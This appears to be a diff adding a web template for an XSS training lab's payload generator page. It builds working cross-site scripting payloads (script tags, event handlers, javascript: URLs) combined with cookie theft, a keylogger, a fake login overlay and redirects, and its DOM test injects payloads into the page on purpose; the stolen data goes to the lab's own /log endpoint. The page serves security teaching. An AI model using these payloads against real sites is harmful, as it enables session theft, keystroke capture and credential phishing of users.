@@ -1,0 +1,517 @@
+{% extends "base.html" %}
+
+{% block title %}Payload Generator - XSS Playground{% endblock %}
+
+{% block content %}
+<div class="container my-5">
+    <!-- Page Header -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <h1 class="display-5 text-secondary mb-3">
+                <i class="fas fa-code me-3"></i>
+                XSS Payload Generator
+            </h1>
+            <p class="lead text-muted">
+                Generate pre-built XSS payloads for different scenarios and learn various attack vectors and techniques.
+            </p>
+        </div>
+    </div>
+
+    <!-- Security Status -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="alert alert-warning">
+                <i class="fas fa-exclamation-triangle me-2"></i>
+                <strong>Educational Use Only:</strong> These payloads are for learning purposes in controlled environments. 
+                Never use these techniques on systems you don't own or without explicit permission.
+            </div>
+        </div>
+    </div>
+
+    <!-- Payload Categories -->
+    <div class="row">
+        <!-- Reflected XSS Payloads -->
+        <div class="col-lg-4 mb-4">
+            <div class="card h-100 border-warning">
+                <div class="card-header bg-warning text-dark">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-search me-2"></i>
+                        Reflected XSS Payloads
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <p class="small text-muted mb-3">
+                        These payloads are designed for reflected XSS attacks where input is immediately echoed back in the response.
+                    </p>
+                    <div class="payload-list">
+                        {% for payload in payloads.reflected %}
+                        <div class="payload-item mb-3 p-3 border rounded">
+                            <div class="d-flex justify-content-between align-items-start mb-2">
+                                <small class="text-muted">Payload {{ loop.index }}</small>
+                                <div class="btn-group btn-group-sm" role="group">
+                                    <button class="btn btn-outline-secondary" onclick="copyToClipboard('{{ payload|replace("'", "\\'") }}')" title="Copy">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                    <button class="btn btn-outline-warning" onclick="testReflectedPayload('{{ payload|replace("'", "\\'") }}')" title="Test">
+                                        <i class="fas fa-play"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="payload-code">
+                                <code class="small text-break">{{ payload }}</code>
+                            </div>
+                        </div>
+                        {% endfor %}
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-warning w-100" onclick="window.open('{{ url_for('reflected_xss') }}', '_blank')">
+                        <i class="fas fa-external-link-alt me-2"></i>Test in Reflected XSS Lab
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Stored XSS Payloads -->
+        <div class="col-lg-4 mb-4">
+            <div class="card h-100 border-danger">
+                <div class="card-header bg-danger text-white">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-database me-2"></i>
+                        Stored XSS Payloads
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <p class="small text-muted mb-3">
+                        These payloads are designed for stored XSS attacks where malicious scripts are saved and executed for multiple users.
+                    </p>
+                    <div class="payload-list">
+                        {% for payload in payloads.stored %}
+                        <div class="payload-item mb-3 p-3 border rounded">
+                            <div class="d-flex justify-content-between align-items-start mb-2">
+                                <small class="text-muted">Payload {{ loop.index }}</small>
+                                <div class="btn-group btn-group-sm" role="group">
+                                    <button class="btn btn-outline-secondary" onclick="copyToClipboard('{{ payload|replace("'", "\\'") }}')" title="Copy">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                    <button class="btn btn-outline-danger" onclick="testStoredPayload('{{ payload|replace("'", "\\'") }}')" title="Test">
+                                        <i class="fas fa-play"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="payload-code">
+                                <code class="small text-break">{{ payload }}</code>
+                            </div>
+                            {% if 'cookie' in payload.lower() %}
+                                <div class="mt-2">
+                                    <span class="badge bg-warning text-dark">
+                                        <i class="fas fa-cookie-bite me-1"></i>Cookie Theft
+                                    </span>
+                                </div>
+                            {% elif 'location' in payload.lower() %}
+                                <div class="mt-2">
+                                    <span class="badge bg-info">
+                                        <i class="fas fa-external-link-alt me-1"></i>Redirect
+                                    </span>
+                                </div>
+                            {% endif %}
+                        </div>
+                        {% endfor %}
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-danger w-100" onclick="window.open('{{ url_for('stored_xss') }}', '_blank')">
+                        <i class="fas fa-external-link-alt me-2"></i>Test in Stored XSS Lab
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- DOM XSS Payloads -->
+        <div class="col-lg-4 mb-4">
+            <div class="card h-100 border-info">
+                <div class="card-header bg-info text-white">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-code-branch me-2"></i>
+                        DOM XSS Payloads
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <p class="small text-muted mb-3">
+                        These payloads exploit client-side DOM manipulation vulnerabilities without server-side involvement.
+                    </p>
+                    <div class="payload-list">
+                        {% for payload in payloads.dom %}
+                        <div class="payload-item mb-3 p-3 border rounded">
+                            <div class="d-flex justify-content-between align-items-start mb-2">
+                                <small class="text-muted">Payload {{ loop.index }}</small>
+                                <div class="btn-group btn-group-sm" role="group">
+                                    <button class="btn btn-outline-secondary" onclick="copyToClipboard('{{ payload|replace("'", "\\'") }}')" title="Copy">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                    <button class="btn btn-outline-info" onclick="testDOMPayload('{{ payload|replace("'", "\\'") }}')" title="Test">
+                                        <i class="fas fa-play"></i>
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="payload-code">
+                                <code class="small text-break">{{ payload }}</code>
+                            </div>
+                            {% if 'eval' in payload.lower() %}
+                                <div class="mt-2">
+                                    <span class="badge bg-danger">
+                                        <i class="fas fa-exclamation-triangle me-1"></i>High Risk
+                                    </span>
+                                </div>
+                            {% elif 'location' in payload.lower() %}
+                                <div class="mt-2">
+                                    <span class="badge bg-warning text-dark">
+                                        <i class="fas fa-external-link-alt me-1"></i>URL Manipulation
+                                    </span>
+                                </div>
+                            {% endif %}
+                        </div>
+                        {% endfor %}
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-info w-100" onclick="window.open('{{ url_for('custom_payload') }}', '_blank')">
+                        <i class="fas fa-external-link-alt me-2"></i>Test in Custom Lab
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payload Builder -->
+    <div class="row mt-4">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-tools me-2"></i>
+                        Interactive Payload Builder
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6>Payload Components</h6>
+                            <div class="mb-3">
+                                <label class="form-label">Execution Method:</label>
+                                <select class="form-select" id="executionMethod" onchange="updatePayloadBuilder()">
+                                    <option value="script">Script Tag</option>
+                                    <option value="img">Image onerror</option>
+                                    <option value="svg">SVG onload</option>
+                                    <option value="iframe">Iframe src</option>
+                                    <option value="div">Div onmouseover</option>
+                                    <option value="input">Input onfocus</option>
+                                </select>
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">Payload Action:</label>
+                                <select class="form-select" id="payloadAction" onchange="updatePayloadBuilder()">
+                                    <option value="alert">Alert Box</option>
+                                    <option value="cookie">Steal Cookies</option>
+                                    <option value="redirect">Page Redirect</option>
+                                    <option value="form">Inject Form</option>
+                                    <option value="keylog">Keylogger</option>
+                                    <option value="custom">Custom JavaScript</option>
+                                </select>
+                            </div>
+                            <div class="mb-3" id="customJSDiv" style="display: none;">
+                                <label class="form-label">Custom JavaScript:</label>
+                                <textarea class="form-control" id="customJS" rows="3" placeholder="Enter custom JavaScript code..."></textarea>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>Generated Payload</h6>
+                            <div class="mb-3">
+                                <textarea class="form-control font-monospace" id="generatedPayload" rows="6" readonly></textarea>
+                            </div>
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-primary" onclick="copyGeneratedPayload()">
+                                    <i class="fas fa-copy me-2"></i>Copy Generated Payload
+                                </button>
+                                <button class="btn btn-outline-secondary" onclick="testGeneratedPayload()">
+                                    <i class="fas fa-vial me-2"></i>Test in Custom Lab
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Educational Resources -->
+    <div class="row mt-4">
+        <div class="col-12">
+            <div class="card border-secondary">
+                <div class="card-header bg-secondary text-white">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-graduation-cap me-2"></i>
+                        Payload Techniques & Explanations
+                    </h5>
+                </div>
+                <div class="card-body">
+                    <div class="accordion" id="techniquesAccordion">
+                        <div class="accordion-item">
+                            <h2 class="accordion-header">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#technique1">
+                                    <i class="fas fa-tag me-2"></i>Script Tag Injection
+                                </button>
+                            </h2>
+                            <div id="technique1" class="accordion-collapse collapse" data-bs-parent="#techniquesAccordion">
+                                <div class="accordion-body">
+                                    <p><strong>Technique:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+                                    <p><strong>How it works:</strong> Injects a script tag that executes JavaScript directly when the HTML is parsed.</p>
+                                    <p><strong>Common targets:</strong> URL parameters, form inputs, search boxes, comment sections.</p>
+                                    <p><strong>Prevention:</strong> HTML encoding of output, Content Security Policy, input validation.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="accordion-item">
+                            <h2 class="accordion-header">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#technique2">
+                                    <i class="fas fa-image me-2"></i>Event Handler Injection
+                                </button>
+                            </h2>
+                            <div id="technique2" class="accordion-collapse collapse" data-bs-parent="#techniquesAccordion">
+                                <div class="accordion-body">
+                                    <p><strong>Technique:</strong> <code>&lt;img src=x onerror=alert('XSS')&gt;</code></p>
+                                    <p><strong>How it works:</strong> Uses HTML element event handlers like onerror, onload, onmouseover to execute JavaScript.</p>
+                                    <p><strong>Advantages:</strong> Often bypasses basic script tag filters, works without closing tags.</p>
+                                    <p><strong>Prevention:</strong> Comprehensive HTML sanitization, CSP restrictions on inline event handlers.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="accordion-item">
+                            <h2 class="accordion-header">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#technique3">
+                                    <i class="fas fa-link me-2"></i>JavaScript Protocol
+                                </button>
+                            </h2>
+                            <div id="technique3" class="accordion-collapse collapse" data-bs-parent="#techniquesAccordion">
+                                <div class="accordion-body">
+                                    <p><strong>Technique:</strong> <code>javascript:alert('XSS')</code></p>
+                                    <p><strong>How it works:</strong> Uses the javascript: protocol in URLs to execute code when the link is clicked or loaded.</p>
+                                    <p><strong>Common contexts:</strong> href attributes, src attributes, location manipulation.</p>
+                                    <p><strong>Prevention:</strong> URL validation, whitelist allowed protocols, CSP restrictions.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+// Initialize payload builder
+document.addEventListener('DOMContentLoaded', function() {
+    updatePayloadBuilder();
+    
+    // Show/hide custom JS textarea
+    document.getElementById('payloadAction').addEventListener('change', function() {
+        const customDiv = document.getElementById('customJSDiv');
+        if (this.value === 'custom') {
+            customDiv.style.display = 'block';
+        } else {
+            customDiv.style.display = 'none';
+        }
+    });
+});
+
+// Update the payload builder based on selections
+function updatePayloadBuilder() {
+    const method = document.getElementById('executionMethod').value;
+    const action = document.getElementById('payloadAction').value;
+    const customJS = document.getElementById('customJS').value;
+    
+    let payload = '';
+    let jsCode = '';
+    
+    // Generate JavaScript code based on action
+    switch(action) {
+        case 'alert':
+            jsCode = 'alert("XSS Payload Executed!")';
+            break;
+        case 'cookie':
+            jsCode = 'alert("Cookies: " + document.cookie); fetch("/log", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({type:"cookie_theft", payload:"document.cookie", cookies:document.cookie, url:window.location.href})})';
+            break;
+        case 'redirect':
+            jsCode = 'alert("Redirecting..."); setTimeout(function(){window.location="https://example.com";}, 2000)';
+            break;
+        case 'form':
+            jsCode = 'document.body.innerHTML += \'<form style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:2px solid red;z-index:9999;"><h3>Login Required</h3><input type="text" placeholder="Username"><br><br><input type="password" placeholder="Password"><br><br><button onclick="alert(\\"Credentials stolen!\\"); this.parentElement.remove();">Login</button></form>\'';
+            break;
+        case 'keylog':
+            jsCode = 'document.addEventListener("keypress", function(e){console.log("Key: " + e.key); fetch("/log", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({type:"keylogger", key:e.key, url:window.location.href})});})';
+            break;
+        case 'custom':
+            jsCode = customJS || 'alert("Custom payload")';
+            break;
+    }
+    
+    // Generate payload based on method
+    switch(method) {
+        case 'script':
+            payload = `<script>${jsCode}</script>`;
+            break;
+        case 'img':
+            payload = `<img src=x onerror="${jsCode}">`;
+            break;
+        case 'svg':
+            payload = `<svg onload="${jsCode}">`;
+            break;
+        case 'iframe':
+            payload = `<iframe src="javascript:${jsCode}"></iframe>`;
+            break;
+        case 'div':
+            payload = `<div onmouseover="${jsCode}">Hover me</div>`;
+            break;
+        case 'input':
+            payload = `<input type="text" onfocus="${jsCode}" autofocus>`;
+            break;
+    }
+    
+    document.getElementById('generatedPayload').value = payload;
+}
+
+// Copy generated payload to clipboard
+function copyGeneratedPayload() {
+    const payload = document.getElementById('generatedPayload').value;
+    copyToClipboard(payload);
+}
+
+// Test generated payload in custom lab
+function testGeneratedPayload() {
+    const payload = document.getElementById('generatedPayload').value;
+    const customURL = '{{ url_for("custom_payload") }}';
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = customURL;
+    form.target = '_blank';
+    
+    const input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'payload';
+    input.value = payload;
+    
+    form.appendChild(input);
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+}
+
+// Test reflected payload
+function testReflectedPayload(payload) {
+    const reflectedURL = '{{ url_for("reflected_xss") }}?q=' + encodeURIComponent(payload);
+    window.open(reflectedURL, '_blank');
+}
+
+// Test stored payload
+function testStoredPayload(payload) {
+    const storedURL = '{{ url_for("stored_xss") }}';
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = storedURL;
+    form.target = '_blank';
+    
+    const usernameInput = document.createElement('input');
+    usernameInput.type = 'hidden';
+    usernameInput.name = 'username';
+    usernameInput.value = 'TestUser';
+    
+    const commentInput = document.createElement('input');
+    commentInput.type = 'hidden';
+    commentInput.name = 'comment';
+    commentInput.value = payload;
+    
+    form.appendChild(usernameInput);
+    form.appendChild(commentInput);
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+}
+
+// Test DOM payload
+function testDOMPayload(payload) {
+    if (confirm('This will execute a DOM XSS payload in the current page. Continue?')) {
+        // Log the DOM XSS attempt
+        logXSSPayload({
+            type: 'dom_xss_test',
+            payload: payload,
+            url: window.location.href,
+            location: 'Payload Generator'
+        });
+        
+        // Create a safe container for DOM payload testing
+        const testContainer = document.createElement('div');
+        testContainer.style.cssText = 'position:fixed;top:10px;right:10px;background:rgba(255,255,255,0.9);border:2px solid red;padding:10px;z-index:9999;max-width:300px;';
+        testContainer.innerHTML = `
+            <h6>DOM XSS Test Container</h6>
+            <div style="border:1px solid #ccc;padding:5px;background:#f9f9f9;color:black;">
+                ${payload}
+            </div>
+            <button onclick="this.parentElement.remove()" style="margin-top:5px;">Close</button>
+        `;
+        document.body.appendChild(testContainer);
+        
+        // Auto-remove after 10 seconds
+        setTimeout(() => {
+            if (document.body.contains(testContainer)) {
+                document.body.removeChild(testContainer);
+            }
+        }, 10000);
+    }
+}
+
+// Copy to clipboard function
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(function() {
+        showToast('Payload copied to clipboard!', 'success');
+    }).catch(function(err) {
+        // Fallback for older browsers
+        const textArea = document.createElement('textarea');
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        textArea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textArea);
+        showToast('Payload copied to clipboard!', 'success');
+    });
+}
+
+// Show toast notification
+function showToast(message, type = 'info') {
+    const toast = document.createElement('div');
+    toast.className = `toast position-fixed top-0 end-0 m-3`;
+    toast.setAttribute('role', 'alert');
+    toast.innerHTML = `
+        <div class="toast-header">
+            <i class="fas fa-${type === 'success' ? 'check-circle text-success' : 'info-circle text-info'} me-2"></i>
+            <strong class="me-auto">${type === 'success' ? 'Success' : 'Info'}</strong>
+            <button type="button" class="btn-close" data-bs-dismiss="toast"></button>
+        </div>
+        <div class="toast-body">
+            ${message}
+        </div>
+    `;
+    document.body.appendChild(toast);
+    
+    const bsToast = new bootstrap.Toast(toast);
+    bsToast.show();
+    
+    toast.addEventListener('hidden.bs.toast', () => {
+        if (document.body.contains(toast)) {
+            document.body.removeChild(toast);
+        }
+    });
+}
+</script>
+{% endblock %}
